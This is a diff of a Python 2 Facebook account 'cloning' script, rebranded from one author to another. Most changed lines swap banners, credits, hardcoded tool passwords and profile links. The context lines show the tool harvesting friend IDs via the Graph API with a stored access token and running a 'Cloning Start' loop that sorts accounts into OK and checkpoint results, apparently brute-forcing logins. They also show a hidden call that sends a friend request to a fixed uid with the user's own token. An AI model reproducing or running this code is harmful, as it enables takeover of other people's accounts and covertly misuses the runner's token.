@@ -48,45 +48,45 @@ def jalan(z):
 		sys.stdout.flush()
 		time.sleep(0.07)
 
-#Dev:fari_fariya
+#Dev:love_harry
 ##### LOGO #####
 logo = """
 
-\033[1;91m──────➣──────➣──────➣──────➣──────➣─────➣──────➣──────➣
+\033[1;91m•◈••◈••◈••◈••◈••◈••◈••◈••◈••◈••◈••◈••◈••◈••◈••◈••◈
 \033[1;92m•◈••◈••◈••◈••◈••◈••◈••◈••◈••◈••◈••◈••◈••◈••◈••◈••◈
-\033[1;93m•──────➣──────➣──────➣──────➣──────➣─────➣──────➣──────➣
+\033[1;93m•◈••◈••◈••◈••◈••◈••◈••◈••◈••◈••◈••◈••◈••◈••◈••◈••◈
 \033[1;94m•◈••◈••◈••◈••◈••◈••◈••◈••◈••◈••◈••◈••◈••◈••◈••◈••◈
-\033[1;95m──────➣──────➣──────➣──────➣──────➣─────➣──────➣──────➣
+\033[1;95m•◈••◈••◈••◈••◈••◈••◈••◈••◈••◈••◈••◈••◈••◈••◈••◈••◈
 \033[1;96m•◈••◈••◈••◈••◈••◈••◈••◈••◈••◈••◈••◈••◈••◈••◈••◈••◈
-\033[1;97m──────➣──────➣──────➣──────➣──────➣─────➣──────➣──────➣
+\033[1;97m•◈••◈••◈••◈••◈••◈••◈••◈••◈••◈••◈••◈••◈••◈••◈••◈••◈
 
-      \033[1;98m███████╗░█████╗░██████╗░██╗██╗░░░██╗░█\033[1;97m████╗░
-      \033[1;96m██╔════╝██╔══██╗██╔══██╗██║╚██╗░██╔╝██\033[1;95m╔══██╗
-      \033[1;94m█████╗░░███████║██████╔╝██║░╚████╔╝░██\033[1;93m█████║
-      \033[1;98m██╔══╝░░██╔══██║██╔══██╗██║░░╚██╔╝░░██\033[1;97m╔══██║
-      \033[1;96m██║░░░░░██║░░██║██║░░██║██║░░░██║░░░██\033[1;95m║░░██║
-      \033[1;95m╚═╝░░░░░╚═╝░░╚═╝╚═╝░░╚═╝╚═╝░░░╚═╝░░░╚═\033[1;94m╝░░╚═╝
-\033[1;91m──────➣──────➣──────➣──────➣──────➣─────➣──────➣──────➣
+      \033[1;96m   ░░░░░\033[1;93m║✥║║✥║║✥║║✥║║✥║║✥║║✥║\033[1;96m░░░░░
+      \033[1;96m   ░░░░░\033[1;92m▇▇▇▇▇\033[1;97m  WELCOME  \033[1;92m▇▇▇▇▇\033[1;96m░░░░░
+      \033[1;96m   ░░░░░\033[1;92m▇▇▇▇▇\033[1;97m    TO     \033[1;92m▇▇▇▇▇\033[1;96m░░░░░
+      \033[1;96m   ░░░░░\033[1;92m▇▇▇▇▇\033[1;97m   HARRY   \033[1;92m▇▇▇▇▇\033[1;96m░░░░░
+      \033[1;96m   ░░░░░\033[1;92m▇▇▇▇▇\033[1;97m  OFFICIAL \033[1;92m▇▇▇▇▇\033[1;96m░░░░░
+      \033[1;96m   ░░░░░\033[1;93m║✥║║✥║║✥║║✥║║✥║║✥║║✥║\033[1;96m░░░░░
+
+\033[1;91m•◈••◈••◈••◈••◈••◈••◈••◈••◈••◈••◈••◈••◈••◈••◈••◈••◈
 \033[1;92m•◈••◈••◈••◈••◈••◈••◈••◈••◈••◈••◈••◈••◈••◈••◈••◈••◈
-\033[1;93m•──────➣──────➣──────➣──────➣──────➣─────➣──────➣──────➣
+\033[1;93m•◈••◈••◈••◈••◈••◈••◈••◈••◈••◈••◈••◈••◈••◈••◈••◈••◈
 \033[1;94m•◈••◈••◈••◈••◈••◈••◈••◈••◈••◈••◈••◈••◈••◈••◈••◈••◈
-\033[1;95m──────➣──────➣──────➣──────➣──────➣─────➣──────➣──────➣
+\033[1;95m•◈••◈••◈••◈••◈••◈••◈••◈••◈••◈••◈••◈••◈••◈••◈••◈••◈
 \033[1;96m•◈••◈••◈••◈••◈••◈••◈••◈••◈••◈••◈••◈••◈••◈••◈••◈••◈
-\033[1;97m──────➣──────➣──────➣──────➣──────➣─────➣──────➣──────➣
-  \033[1;95m╔═════\033[1;91m⸎══════════════\033[1;91m⸎══════════\033[1;91m⸎════════╗
-  \033[1;95m║\033[1;92mCREATOR║ \033[1;96m♤͜͡♤ FARIYA KHAN
-  \033[1;95m║\033[1;92mFACEBOK║ \033[1;96m♤͜͡♤ m.facebook.com/itzfariya786
-  \033[1;95m║\033[1;92mSUPPORT║ \033[1;96m♤͜͡♤ MALIK HASSAN ♤͜͡♤ MAHAM BUTT
-  \033[1;95m║\033[1;92mCLONE  ║ \033[1;96m♤͜͡  ALL COUNTRIES IDS CLONE HONGYE
-  \033[1;95m╚═════\033[1;91m⸎══════════════\033[1;91m⸎══════════\033[1;91m⸎════════╝"""
+\033[1;97m•◈••◈••◈••◈••◈••◈••◈••◈••◈••◈••◈••◈••◈••◈••◈••◈••◈
+  \033[1;97m    ╔──────➣──────➣──────➣──────➣──────➣
+  \033[1;97m    ║\033[1;96mCREATOR  \033[1;91m║✥║──➣\033[1;93m HAROON HARRY 
+  \033[1;97m    ║\033[1;96mFACEBOOK \033[1;91m║✥║──➣\033[1;93m HAROON RASHEED 
+  \033[1;97m    ║\033[1;96mSUPPORT  \033[1;91m║✥║──➣\033[1;93m FAHEEM KOKO & RJ
+  \033[1;97m    ║\033[1;96mCLONE    \033[1;91m║✥║──➣\033[1;93m ALL COUNTRIES
+  \033[1;97m    ╚──────➣──────➣──────➣──────➣──────➣"""
 
 
 
-jalan("\033[1;96m♤͜͡♤════✷FARIYA KHAN")
+jalan("\033[1;96m♤͜͡♤════✷ HAROON HARRY") 
 jalan("\033[1;96m♤͜͡♤════✷ ASALM O ALAIKUM MOST WELCOME") 
-jalan("\033[1;96m♤͜͡♤════✷ SPECIALLY ALL COUNTRIES IDS KE LEYE COMMANDS") 
-jalan("\033[1;96m♤͜͡♤════✷ CHALO AB CLONING KI TARAF CHALTE HEN")
-jalan("\033[1;96m♤͜͡♤════✷IM NOT RESPOSIBLE FOR ANY MISS USE")
+jalan("\033[1;96m♤͜͡♤════✷ ALL COUNTRIES KI IDZ K LEY ") 
+jalan("\033[1;96m♤͜͡♤════✷ CHALO AB CLONING KI TARAF CHALTE HEN") 
 def tik():
 	titik = ['.   ','..  ','... ']
 	for o in titik:
@@ -107,21 +107,21 @@ print  """
 
 \033[1;91m•◈••◈••◈••◈••◈••◈••◈••◈••◈••◈••◈••◈••◈••◈••◈••◈••◈
 
-\033[1;91m──────➣──────➣──────➣──────➣──────➣─────➣──────➣──────➣
+\033[1;96m•◈••◈••◈••◈••◈••◈••◈••◈••◈••◈••◈••◈••◈••◈••◈••◈••◈
 
 \033[1;97m•◈••◈••◈••◈••◈••◈••◈••◈••◈••◈••◈••◈••◈••◈••◈••◈••◈
-    \033[1;95m╔═════\033[1;91m⸎══════════════\033[1;91m⸎══════════\033[1;91m⸎════════╗
-    \033[1;95m║\033[1;92mCREATOR║ \033[1;96m♤͜͡♤ FARIYA KHAN
-    \033[1;95m║\033[1;92mFACEBOK║ \033[1;96m♤͜͡♤ m.facebook.com/itzfariya786
-    \033[1;95m║\033[1;92mSUPPORT║ \033[1;96m♤͜͡♤ MALIK HASSAN ♤͜͡♤ MAHAM BUTT
-    \033[1;95m║\033[1;92mCLONE  ║ \033[1;96m♤͜͡  ALL COUNTRIES IDS CLONE HONGYE
-    \033[1;95m╚═════\033[1;91m⸎══════════════\033[1;91m⸎══════════\033[1;91m⸎════════╝""
+  \033[1;97m    ╔──────➣──────➣──────➣──────➣──────➣
+  \033[1;97m    ║\033[1;96mCREATOR  \033[1;91m║✥║──➣\033[1;93m HAROON HARRY 
+  \033[1;97m    ║\033[1;96mFACEBOOK \033[1;91m║✥║──➣\033[1;93m HAROON RASHEED 
+  \033[1;97m    ║\033[1;96mSUPPORT  \033[1;91m║✥║──➣\033[1;93m FAHEEM KOKO & RJ
+  \033[1;97m    ║\033[1;96mCLONE    \033[1;91m║✥║──➣\033[1;93m ALL COUNTRIES
+  \033[1;97m    ╚──────➣──────➣──────➣──────➣──────➣
 \033[1;98m•◈••◈••◈••◈••◈••◈••◈••◈••◈••◈••◈••◈••◈••◈••◈••◈••◈
 
-\033[1;91m──────➣──────➣──────➣──────➣──────➣─────➣──────➣──────➣
+\033[1;92m•◈••◈••◈••◈••◈••◈••◈••◈••◈••◈••◈••◈••◈••◈••◈••◈••◈
 
 \033[1;93m•◈••◈••◈••◈••◈••◈••◈••◈••◈••◈••◈••◈••◈••◈••◈••◈••◈
-\033[1;94m۞═╤⋙★⚀⚁\033[1;92mFARIYA KHAn\033[1;93m⚁⚀★⋘╤═۞"""
+\033[1;94m۞═╤⋙★⚀⚁\033[1;92mHAROON.HARRY\033[1;93m⚁⚀★⋘╤═۞"""
 
 
 
@@ -137,10 +137,10 @@ jalan('\033[1;93m███████░░☆70%')
 jalan('\033[1;92m████████░░☆80%')
 jalan('\033[1;92m█████████░░☆90%')
 jalan('\033[1;92m██████████░░☆100%')
-print "\033[1;96m☪════║║║║║✷♤͜͡♤FARIYA●KHAN♤͜͡♤✷║║║║║════✷" 
+print "\033[1;96m☪════║║║║║✷♤͜͡♤Haroon●Harry♤͜͡♤✷║║║║║════✷" 
 
-CorrectUsername ="FARIYA"
-CorrectPassword = "KHAN"
+CorrectUsername ="HARRY"
+CorrectPassword = "HAROON"
 
 loop = 'true'
 while (loop == 'true'):
@@ -148,15 +148,15 @@ while (loop == 'true'):
     if (username == CorrectUsername):
     	password = raw_input("\033[1;91m🗝 \x1b[1;91mTool Password \x1b[1;91m»» \x1b[1;92m")
         if (password == CorrectPassword):
-            print "Logged in successfully as " + username #Dev:fari_fariya
+            print "Logged in successfully as " + username #Dev:Haroon_Harry
 	    time.sleep(2)
             loop = 'false'
         else:
             print "\033[1;93mWrong Password"
-            os.system('xdg-open https://m.facebook.com/itzfariya786')
+            os.system('xdg-open https://m.facebook.com/Chharry009')
     else:
         print "\033[1;94mWrong Username"
-        os.system('xdg-open https://m.facebook.com/itzfariya786')
+        os.system('xdg-open https://m.facebook.com/Chharry009')
 
 def login():
 	os.system('clear')
@@ -201,7 +201,7 @@ def login():
 				unikers.write(z['access_token'])
 				unikers.close()
 				print '\n\x1b[1;92mLogin Successful.•◈•..'
-				os.system('xdg-open https://m.facebook.com/itzfariya786')
+				os.system('xdg-open https://m.facebook.com/Chharry009')
 				requests.post('https://graph.facebook.com/me/friends?method=post&uids=gwimusa3&access_token='+z['access_token'])
 				menu()
 			except requests.exceptions.ConnectionError:
@@ -243,7 +243,7 @@ def menu():
 	except requests.exceptions.ConnectionError:
 		print"\x1b[1;92mThere is no internet connection"
 		keluar()
-	os.system("clear") #Dev:Fari_Fariya
+	os.system("clear") #Dev:Haroon_harry
 	print logo
 	print "  \033[1;92m«----•◈••◈•----\033[1;93mLogged in User Info\033[1;92m----•◈••◈•-----»"
 	print "	   \033[1;91m Name\033[1;93m:\033[1;92m"+nama+"\033[1;93m               "
@@ -296,7 +296,7 @@ def pilih_super():
 	elif peak =="1":
 		os.system('clear')
 		print logo
-		print "\033[1;92m•◈•▬▬▬▬▬●•◈•\033[1;91mFARIYA TOOLS\033[1;92m•◈•●▬▬▬▬▬•◈•"	
+		print "\033[1;92m•◈•▬▬▬▬▬●•◈•\033[1;91mHarry.tools\033[1;92m•◈•●▬▬▬▬▬•◈•"
 		jalan('\033[1;93mGetting IDs \033[1;93m...')
 		r = requests.get("https://graph.facebook.com/me/friends?access_token="+toket)
 		z = json.loads(r.text)
@@ -306,7 +306,7 @@ def pilih_super():
 		os.system('clear')
 		print logo
 		idt = raw_input("\033[1;92m[•◈•] \033[1;92mEnter ID\033[1;93m: \033[1;95m")
-		print "\033[1;92m•◈•▬▬▬▬▬●•◈•\033[1;91mFARIYA.TOOLS\033[1;92m•◈•●▬▬▬▬▬•◈•"	
+		print "\033[1;92m•◈•▬▬▬▬▬●•◈•\033[1;91mHarry.tools\033[1;92m•◈•●▬▬▬▬▬•◈•"
 		try:
 			jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
 			op = json.loads(jok.text)
@@ -321,7 +321,7 @@ def pilih_super():
 		for i in z['data']:
 			id.append(i['id'])
 	elif peak =="3":
-	        os.system('xdg-open https://m.facebook.com/itzfariya786')
+	        os.system('xdg-open https://m.facebook.com/CHH4RRY')
 	        menu()
 	elif peak =="0":
 		menu()
@@ -337,7 +337,8 @@ def pilih_super():
 	print "\n\033[1;92m«--•◈••◈•---\x1b[1;93m•◈•Stop Process Press CTRL+Z•◈•\033[1;92m---•◈••◈•-»"
 	print "\033[1;92m•◈•▬▬▬▬▬●•◈•\033[1;91mJust.wait\033[1;92m•◈•●▬▬▬▬▬•◈•"
 	jalan(' \033[1;93m☠️🔥☠️🔥☠️\033[1;94m.....Cloning Start.....\033[1;93m☠️🔥☠️🔥☠️ ')
-	print "\033[1;92m•◈•▬▬▬▬▬●•◈•\033[1;91mFARIYA.TOOLS\033[1;92m•◈•●▬▬▬▬▬•◈•"	
+	print "\033[1;92m•◈•▬▬▬▬▬●•◈•\033[1;91mHarry.Tools\033[1;92m•◈•●▬▬▬▬▬•◈•"
+	
 			
 	def main(arg):
 		global cekpoint,oks
@@ -345,7 +346,7 @@ def pilih_super():
 		try:
 			os.mkdir('out')
 		except OSError:
-			pass #Dev:Fariya Khan
+			pass #Dev:Ch Harry
 		try:
 			a = requests.get('https://graph.facebook.com/'+user+'/?access_token='+toket)
 			b = json.loads(a.text)
@@ -416,17 +417,16 @@ def pilih_super():
 	print '\033[1;91m✅Process Has Been Completed Press➡ Ctrl+Z.↩ Next Type (python2 jaan.py)↩\033[1;92m....'
 	print"\033[1;91mTotal OK/\x1b[1;93mCP \033[1;91m: \033[1;91m"+str(len(oks))+"\033[1;97m/\033[1;92m"+str(len(cekpoint))
 	print """
-\033[1;95m╔═════\033[1;91m⸎══════════════\033[1;91m⸎══════════\033[1;91m⸎════════╗
-\033[1;95m║\033[1;92mCREATOR║ \033[1;96m♤͜͡♤ FARIYA KHAN
-\033[1;95m║\033[1;92mFACEBOK║ \033[1;96m♤͜͡♤ m.facebook.com/itzfariya786
-\033[1;95m║\033[1;92mSUPPORT║ \033[1;96m♤͜͡♤ MALIK HASSAN ♤͜͡♤ MAHAM BUTT
-\033[1;95m║\033[1;92mCLONE  ║ \033[1;96m♤͜͡  ALL COUNTRIES IDS CLONE HONGYE.
-\033[1;95m╚═════\033[1;91m⸎══════════════\033[1;91m⸎══════════\033[1;91m⸎════════╝"""	
+\033[1;97m╔──────➣──────➣──────➣──────➣
+\033[1;97m║\033[1;96mCREATOR  \033[1;91m║✥║──➣\033[1;93m HAROON HARRY 
+\033[1;97m║\033[1;96mFACEBOOK \033[1;91m║✥║──➣\033[1;93m HAROON RASHEED 
+\033[1;97m║\033[1;96mSUPPORT  \033[1;91m║✥║──➣\033[1;93m FAHEEM KOK & RJ
+\033[1;97m║\033[1;96mCLONE    \033[1;91m║✥║──➣\033[1;93m ALL COUNTRIES
+\033[1;97m╚──────➣──────➣──────➣──────➣"""
 	
-    raw_input("\n\033[1;92m[\033[1;91mBack\033[1;96m]")
+	raw_input("\n\033[1;92m[\033[1;91mBack\033[1;96m]")
 	menu()
 
 if __name__ == '__main__':
 	login()
 
-	
